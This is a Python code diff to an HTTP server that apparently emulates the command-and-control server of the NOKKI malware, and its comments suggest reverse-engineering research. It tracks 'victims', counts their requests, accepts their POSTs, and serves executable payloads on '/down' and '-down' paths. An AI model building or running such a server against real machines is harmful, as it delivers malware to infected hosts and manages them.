@@ -12,14 +12,14 @@ import os.path
 
 victim_list = {}
 
+
 class NOKKIvictim:
+    # TODO: add victim_list as static variable in this NOKKIvictim class
     # type = '[null]'  # request type: parse either 'file' or 'log': default to '[null]'
     # subject
     # time
     # date
     # data
-
-    # victim_filename
 
     count_post = 0
     count_get = 0
@@ -59,11 +59,18 @@ class NOKKIvictim:
 
     @staticmethod
     def set_generic_filename(filename):
-        NOKKIvictim.generic_filename = filename  # TODO: do checks on file first, ret 0 if failed
-        return NOKKIvictim.generic_filename
+        if os.path.exists(filename):
+            return NOKKIvictim.generic_filename
+        else:
+            return ''
 
-    def add_victim_filename(self, filename):  # allows for queuing of files
-        self.victim_filename.append(filename)  # TODO: do checks on file first, ret 0 if failed
+    def add_victim_filename(self, filename):
+        # allows for queuing of files
+        if os.path.exists(filename):
+            self.victim_filename.append(filename)
+            return filename
+        else:
+            return ''
 
     @staticmethod
     def ret_generic_filename():
@@ -103,36 +110,38 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
         logging.info(self.command + ": " + req_path)
         content_length = self.headers.get('Content-Length')
 
+        # TODO: remove near end and after some more RE-- doesn't seem necessary
         if type(content_length) == str:  # parsing Content-Length value if exists
             if int(content_length) > 0:
                 raise Exception('Received Content-Length on GET request.')
                 # TODO: specify exception; used for debugging currently
 
+        # response_data = b''
+
         if req_path.endswith("/down"):  # Generic Upload to Request
-            # response written to weewyesqsf4.exe on victim
-            filename = 'generic_file.exe'
+            # victim writes response to weewyesqsf4.exe
             logging.info('Generic Upload Request')
 
+            # retrieves payload for generic victim request
+            response_data = NOKKIvictim.ret_generic_file_data()
+
         elif req_path.endswith("-down"):  # Specific Upload to Request
-            # response written to wirbiry2jsq3454.exe on victim
+            # victim writes response written to wirbiry2jsq3454.exe
             victim_id = req_path.split('-down')[0][-10:]
 
+            # adds one to the request count of the victim
             victim = victim_list.get(victim_id)
             if victim:
-                victim.inc_get_count()  # adds one to the request count of the victim
+                victim.inc_get_count()
 
             logging.info("victim_id: " + victim_id)
-            filename = victim_id + '_file.exe'
             logging.info('Specific Upload Request')
 
-        else:
-            filename = ''  # TODO: will be necessary when below exception is changed
-            raise Exception()  # TODO: better handle this exception
+            # retrieves payload for specific victim request
+            response_data = victim_list[victim_id].ret_victim_file_data()
 
-        if os.path.exists(filename):
-            response_data = open(filename, 'rb').read()
         else:
-            response_data = b'\x00'
+            raise Exception()  # TODO: better handle this exception; change to return nothing after some more RE
 
         self.send_response(200)
         self.send_header("Content-type", "text/html")
@@ -163,12 +172,11 @@ class RequestHandler(http.server.SimpleHTTPRequestHandler):
         else:
             raise Exception()  # TODO: specify exception after testing: used for debugging currently
 
-        response_data = b''  # not required, the victim does not read response after POST request
         self.send_response(200)
         self.send_header("Content-req_type", "text/html")
-        self.send_header("Content-Length", len(response_data))
+        self.send_header("Content-Length", 0)
         self.end_headers()
-        self.wfile.write(response_data)
+        self.wfile.write(b'')  # response data not necessary for POST requests
         return
 
 
@@ -202,7 +210,7 @@ def main_menu():
         print('----------------------------------------')
         try:
             menu_option = int(input(':'))
-        except Exception(''):  # TODO: specify exception
+        except Exception():  # TODO: specify exception
             break
 
         if menu_option == 0:  # LIST VICTIMS
